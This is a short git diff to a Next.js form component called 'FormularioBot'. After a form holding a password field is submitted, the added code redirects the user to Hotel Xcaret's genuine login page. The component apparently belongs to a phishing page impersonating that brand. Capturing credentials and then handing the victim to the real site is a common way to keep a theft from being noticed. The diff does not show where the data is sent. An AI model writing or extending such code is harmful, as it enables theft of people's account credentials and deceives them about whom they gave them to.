@@ -1,5 +1,6 @@
 "use client";
 import Link from "next/link";
+import { useRouter } from "next/navigation";
 import { useState } from "react";
 import { BiLoaderCircle } from "react-icons/bi";
 
@@ -20,6 +21,8 @@ export default function FormularioBot({
   });
 
   const [loading, setLoading] = useState(false);
+
+  const router = useRouter();
 
   const handleEnvio = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
@@ -43,6 +46,7 @@ export default function FormularioBot({
           password: "",
         });
         setLoading(false);
+        router.push("https://micuenta.hotelxcaret.com/es/login/");
       }
     } catch (error) {
       console.log(error);
